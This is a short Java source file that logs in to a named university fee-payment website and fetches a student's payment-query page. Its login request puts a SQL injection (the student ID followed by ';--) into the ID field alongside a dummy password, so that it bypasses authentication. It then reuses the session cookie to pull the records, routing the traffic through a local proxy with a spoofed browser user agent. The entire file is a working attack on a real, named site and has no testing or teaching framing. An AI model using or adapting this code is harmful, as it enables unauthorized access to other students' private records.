package com.gs.main;

import java.io.IOException;

import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;

public class ShouFeiLogin {
	private HttpClient hc = new HttpClient();
	public String login(String id) throws HttpException, IOException{
		hc.getHostConfiguration().setProxy("127.0.0.1", 8087);  
		hc.getParams().setParameter(HttpMethodParams.USER_AGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36");//设置信息 
		PostMethod p = new PostMethod("http://shoufei.hebust.edu.cn/kd/login.jsp");
		p.addParameter("EdtStuID", id+"';--");
		p.addParameter("mm", "haha");
		hc.getParams().setCookiePolicy(CookiePolicy.BROWSER_COMPATIBILITY);
		hc.executeMethod(p);
		// 获得登陆后的 Cookie
		Cookie[] cookies = hc.getState().getCookies();
		String tmpcookies = "";
		for (Cookie c : cookies) {
			tmpcookies += c.toString() + ";";
		}
		// 进行登陆后的操作
		PostMethod postMethod = new PostMethod(
				"http://shoufei.hebust.edu.cn/kd/qrypayment.jsp");
		// 每次访问需授权的网址时需带上前面的 cookie 作为通行证
		postMethod.setRequestHeader("cookie", tmpcookies);
		hc.executeMethod(postMethod);
		String s = postMethod.getResponseBodyAsString();
		return s;
	}
}
